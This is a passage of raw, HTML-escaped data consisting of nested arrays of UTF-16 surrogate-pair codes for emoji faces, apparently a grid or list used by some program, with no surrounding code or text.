&quot;d83d,de16&quot;, &quot;d83d,de07&quot;, &quot;d83d,de26&quot;, &quot;d83d,de09&quot;, &quot;d83d,de08&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de23&quot;, &quot;d83d,de09&quot;, &quot;d83d,de13&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de03&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de28&quot;, &quot;d83d,de16&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de19&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de23&quot; ], [ &quot;d83d,de1c&quot;, &quot;d83d,de09&quot;, &quot;d83d,de07&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de12&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de02&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de03&quot;, &quot;d83d,de04&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de24&quot;, &quot;d83d,de11&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de17&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de21&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de28&quot;, &quot;d83d,de09&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de28&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de00&quot;, &quot;d83d,de21&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de05&quot;, &quot;d83d,de27&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de14&quot;, &quot;d83d,de28&quot;, &quot;d83d,de17&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de28&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de08&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de24&quot; ], [ &quot;d83d,de0d&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de05&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de17&quot;, &quot;d83d,de22&quot;, &quot;d83d,de07&quot;, &quot;d83d,de03&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de03&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de22&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de22&quot;, &quot;d83d,de22&quot;, &quot;d83d,de14&quot;, &quot;d83d,de27&quot;, &quot;d83d,de25&quot;, &quot;d83d,de22&quot;, &quot;d83d,de01&quot;, &quot;d83d,de20&quot;, &quot;d83d,de00&quot;, &quot;d83d,de19&quot;, &quot;d83d,de05&quot;, &quot;d83d,de11&quot;, &quot;d83d,de15&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de15&quot;, &quot;d83d,de11&quot;, &quot;d83d,de21&quot;, &quot;d83d,de14&quot;, &quot;d83d,de18&quot;, &quot;d83d,de19&quot;, &quot;d83d,de02&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de15&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de1e&quot; ], [ &quot;d83d,de13&quot;, &quot;d83d,de16&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de11&quot;, &quot;d83d,de07&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de15&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de09&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de26&quot;, &quot;d83d,de29&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de28&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de25&quot;, &quot;d83d,de17&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de00&quot;, &quot;d83d,de09&quot;, &quot;d83d,de07&quot;, &quot;d83d,de27&quot;, &quot;d83d,de05&quot;, &quot;d83d,de28&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de16&quot;, &quot;d83d,de11&quot;, &quot;d83d,de05&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de04&quot;, &quot;d83d,de05&quot;, &quot;d83d,de03&quot;, &quot;d83d,de24&quot;, &quot;d83d,de12&quot;, &quot;d83d,de09&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de18&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de05&quot;, &quot;d83d,de04&quot; ], [ &quot;d83d,de0e&quot;, &quot;d83d,de06&quot;, &quot;d83d,de01&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de15&quot;, &quot;d83d,de20&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de09&quot;, &quot;d83d,de10&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de10&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de25&quot;, &quot;d83d,de22&quot;, &quot;d83d,de02&quot;, &quot;d83d,de08&quot;, &quot;d83d,de14&quot;, &quot;d83d,de14&quot;, &quot;d83d,de06&quot;, &quot;d83d,de23&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de02&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de10&quot;, &quot;d83d,de20&quot;, &quot;d83d,de07&quot;, &quot;d83d,de14&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de17&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de07&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de28&quot; ], [ &quot;d83d,de27&quot;, &quot;d83d,de03&quot;, &quot;d83d,de29&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de04&quot;, &quot;d83d,de08&quot;, &quot;d83d,de15&quot;, &quot;d83d,de02&quot;, &quot;d83d,de21&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de21&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de06&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de15&quot;, &quot;d83d,de28&quot;, &quot;d83d,de28&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de22&quot;, &quot;d83d,de26&quot;, &quot;d83d,de18&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de27&quot;, &quot;d83d,de17&quot;, &quot;d83d,de07&quot;, &quot;d83d,de05&quot;, &quot;d83d,de07&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de16&quot;, &quot;d83d,de22&quot;, &quot;d83d,de18&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de26&quot;, &quot;d83d,de25&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de12&quot;, &quot;d83d,de26&quot;, &quot;d83d,de21&quot;, &quot;d83d,de2b&quot; ], [ &quot;d83d,de2a&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de09&quot;, &quot;d83d,de16&quot;, &quot;d83d,de06&quot;, &quot;d83d,de02&quot;, &quot;d83d,de25&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de01&quot;, &quot;d83d,de02&quot;, &quot;d83d,de29&quot;, &quot;d83d,de09&quot;, &quot;d83d,de01&quot;, &quot;d83d,de00&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de13&quot;, &quot;d83d,de08&quot;, &quot;d83d,de04&quot;, &quot;d83d,de24&quot;, &quot;d83d,de15&quot;, &quot;d83d,de19&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de06&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de16&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de19&quot;, &quot;d83d,de03&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de19&quot;, &quot;d83d,de20&quot;, &quot;d83d,de10&quot;, &quot;d83d,de17&quot;, &quot;d83d,de06&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de22&quot;, &quot;d83d,de10&quot; ], [ &quot;d83d,de1e&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de10&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de07&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de24&quot;, &quot;d83d,de09&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de09&quot;, &quot;d83d,de12&quot;, &quot;d83d,de25&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de15&quot;, &quot;d83d,de04&quot;, &quot;d83d,de16&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de10&quot;, &quot;d83d,de08&quot;, &quot;d83d,de03&quot;, &quot;d83d,de18&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de25&quot;, &quot;d83d,de23&quot;, &quot;d83d,de27&quot;, &quot;d83d,de12&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de27&quot;, &quot;d83d,de11&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de21&quot;, &quot;d83d,de20&quot;, &quot;d83d,de05&quot;, &quot;d83d,de01&quot;, &quot;d83d,de18&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de01&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de11&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de13&quot;, &quot;d83d,de28&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de09&quot;, &quot;d83d,de2d&quot; ], [ &quot;d83d,de09&quot;, &quot;d83d,de26&quot;, &quot;d83d,de29&quot;, &quot;d83d,de27&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de06&quot;, &quot;d83d,de06&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de09&quot;, &quot;d83d,de12&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de02&quot;, &quot;d83d,de28&quot;, &quot;d83d,de05&quot;, &quot;d83d,de28&quot;, &quot;d83d,de00&quot;, &quot;d83d,de18&quot;, &quot;d83d,de21&quot;, &quot;d83d,de23&quot;, &quot;d83d,de07&quot;, &quot;d83d,de20&quot;, &quot;d83d,de02&quot;, &quot;d83d,de23&quot;, &quot;d83d,de18&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de29&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de28&quot;, &quot;d83d,de12&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de23&quot;, &quot;d83d,de00&quot;, &quot;d83d,de09&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de25&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de20&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de2e&quot; ], [ &quot;d83d,de06&quot;, &quot;d83d,de12&quot;, &quot;d83d,de28&quot;, &quot;d83d,de01&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de24&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de22&quot;, &quot;d83d,de09&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de28&quot;, &quot;d83d,de29&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de29&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de23&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de03&quot;, &quot;d83d,de01&quot;, &quot;d83d,de16&quot;, &quot;d83d,de10&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de06&quot;, &quot;d83d,de29&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de25&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de12&quot;, &quot;d83d,de10&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de08&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de02&quot;, &quot;d83d,de19&quot;, &quot;d83d,de20&quot;, &quot;d83d,de23&quot;, &quot;d83d,de14&quot;, &quot;d83d,de02&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de1a&quot; ], [ &quot;d83d,de00&quot;, &quot;d83d,de28&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de14&quot;, &quot;d83d,de18&quot;, &quot;d83d,de19&quot;, &quot;d83d,de16&quot;, &quot;d83d,de21&quot;, &quot;d83d,de09&quot;, &quot;d83d,de08&quot;, &quot;d83d,de20&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de00&quot;, &quot;d83d,de03&quot;, &quot;d83d,de19&quot;, &quot;d83d,de28&quot;, &quot;d83d,de12&quot;, &quot;d83d,de15&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de21&quot;, &quot;d83d,de11&quot;, &quot;d83d,de07&quot;, &quot;d83d,de23&quot;, &quot;d83d,de22&quot;, &quot;d83d,de07&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de15&quot;, &quot;d83d,de21&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de21&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de04&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de00&quot;, &quot;d83d,de00&quot;, &quot;d83d,de1e&quot; ], [ &quot;d83d,de23&quot;, &quot;d83d,de15&quot;, &quot;d83d,de15&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de05&quot;, &quot;d83d,de06&quot;, &quot;d83d,de06&quot;, &quot;d83d,de18&quot;, &quot;d83d,de08&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de06&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de14&quot;, &quot;d83d,de10&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de21&quot;, &quot;d83d,de07&quot;, &quot;d83d,de28&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de23&quot;, &quot;d83d,de00&quot;, &quot;d83d,de10&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de17&quot;, &quot;d83d,de10&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de29&quot;, &quot;d83d,de25&quot;, &quot;d83d,de24&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de24&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de25&quot; ], [ &quot;d83d,de14&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de28&quot;, &quot;d83d,de15&quot;, &quot;d83d,de08&quot;, &quot;d83d,de09&quot;, &quot;d83d,de16&quot;, &quot;d83d,de28&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de12&quot;, &quot;d83d,de16&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de23&quot;, &quot;d83d,de01&quot;, &quot;d83d,de28&quot;, &quot;d83d,de24&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de01&quot;, &quot;d83d,de22&quot;, &quot;d83d,de21&quot;, &quot;d83d,de18&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de19&quot;, &quot;d83d,de05&quot;, &quot;d83d,de29&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de07&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de07&quot;, &quot;d83d,de13&quot;, &quot;d83d,de10&quot;, &quot;d83d,de02&quot;, &quot;d83d,de01&quot;, &quot;d83d,de01&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de24&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de29&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de14&quot; ], [ &quot;d83d,de28&quot;, &quot;d83d,de08&quot;, &quot;d83d,de22&quot;, &quot;d83d,de06&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de10&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de03&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de04&quot;, &quot;d83d,de02&quot;, &quot;d83d,de11&quot;, &quot;d83d,de06&quot;, &quot;d83d,de19&quot;, &quot;d83d,de14&quot;, &quot;d83d,de19&quot;, &quot;d83d,de00&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de28&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de23&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de05&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de22&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de07&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de29&quot;, &quot;d83d,de29&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de08&quot; ], [ &quot;d83d,de29&quot;, &quot;d83d,de08&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de29&quot;, &quot;d83d,de22&quot;, &quot;d83d,de18&quot;, &quot;d83d,de26&quot;, &quot;d83d,de29&quot;, &quot;d83d,de05&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de03&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de06&quot;, &quot;d83d,de02&quot;, &quot;d83d,de20&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de00&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de07&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de21&quot;, &quot;d83d,de29&quot;, &quot;d83d,de26&quot;, &quot;d83d,de05&quot;, &quot;d83d,de12&quot;, &quot;d83d,de16&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de00&quot;, &quot;d83d,de01&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de01&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de27&quot;, &quot;d83d,de0f&quot; ], [ &quot;d83d,de03&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de13&quot;, &quot;d83d,de02&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de16&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de01&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de29&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de27&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de14&quot;, &quot;d83d,de11&quot;, &quot;d83d,de10&quot;, &quot;d83d,de15&quot;, &quot;d83d,de03&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de28&quot;, &quot;d83d,de15&quot;, &quot;d83d,de17&quot;, &quot;d83d,de07&quot;, &quot;d83d,de21&quot;, &quot;d83d,de05&quot;, &quot;d83d,de16&quot;, &quot;d83d,de03&quot;, &quot;d83d,de26&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de19&quot;, &quot;d83d,de01&quot;, &quot;d83d,de09&quot;, &quot;d83d,de02&quot;, &quot;d83d,de14&quot;, &quot;d83d,de13&quot;, &quot;d83d,de29&quot; ], [ &quot;d83d,de1c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de10&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de09&quot;, &quot;d83d,de18&quot;, &quot;d83d,de00&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de17&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de22&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de09&quot;, &quot;d83d,de16&quot;, &quot;d83d,de07&quot;, &quot;d83d,de20&quot;, &quot;d83d,de16&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de29&quot;, &quot;d83d,de28&quot;, &quot;d83d,de10&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de26&quot;, &quot;d83d,de12&quot;, &quot;d83d,de08&quot;, &quot;d83d,de01&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de00&quot;, &quot;d83d,de17&quot;, &quot;d83d,de05&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de27&quot;, &quot;d83d,de25&quot;, &quot;d83d,de24&quot;, &quot;d83d,de28&quot; ], [ &quot;d83d,de08&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de28&quot;, &quot;d83d,de13&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de07&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de19&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de19&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de25&quot;, &quot;d83d,de22&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de14&quot;, &quot;d83d,de08&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de00&quot;, &quot;d83d,de19&quot;, &quot;d83d,de10&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de07&quot;, &quot;d83d,de01&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de13&quot;, &quot;d83d,de02&quot;, &quot;d83d,de25&quot;, &quot;d83d,de18&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de02&quot;, &quot;d83d,de13&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de10&quot;, &quot;d83d,de24&quot;, &quot;d83d,de27&quot;, &quot;d83d,de04&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de05&quot; ], [ &quot;d83d,de0b&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de25&quot;, &quot;d83d,de10&quot;, &quot;d83d,de29&quot;, &quot;d83d,de20&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de06&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de13&quot;, &quot;d83d,de05&quot;, &quot;d83d,de13&quot;, &quot;d83d,de23&quot;, &quot;d83d,de23&quot;, &quot;d83d,de18&quot;, &quot;d83d,de10&quot;, &quot;d83d,de23&quot;, &quot;d83d,de23&quot;, &quot;d83d,de06&quot;, &quot;d83d,de23&quot;, &quot;d83d,de19&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de24&quot;, &quot;d83d,de06&quot;, &quot;d83d,de11&quot;, &quot;d83d,de01&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de01&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de17&quot;, &quot;d83d,de25&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de20&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de14&quot;, &quot;d83d,de09&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de29&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de16&quot;, &quot;d83d,de12&quot;, &quot;d83d,de26&quot; ], [ &quot;d83d,de16&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de29&quot;, &quot;d83d,de17&quot;, &quot;d83d,de20&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de07&quot;, &quot;d83d,de04&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de15&quot;, &quot;d83d,de02&quot;, &quot;d83d,de02&quot;, &quot;d83d,de29&quot;, &quot;d83d,de18&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de11&quot;, &quot;d83d,de24&quot;, &quot;d83d,de18&quot;, &quot;d83d,de03&quot;, &quot;d83d,de07&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de19&quot;, &quot;d83d,de18&quot;, &quot;d83d,de13&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de08&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de23&quot;, &quot;d83d,de21&quot;, &quot;d83d,de29&quot;, &quot;d83d,de21&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de21&quot; ], [ &quot;d83d,de20&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de08&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de23&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de05&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de13&quot;, &quot;d83d,de16&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de11&quot;, &quot;d83d,de19&quot;, &quot;d83d,de29&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de05&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de00&quot;, &quot;d83d,de05&quot;, &quot;d83d,de17&quot;, &quot;d83d,de13&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de22&quot;, &quot;d83d,de16&quot;, &quot;d83d,de15&quot;, &quot;d83d,de06&quot;, &quot;d83d,de04&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de21&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de04&quot;, &quot;d83d,de1e&quot;, 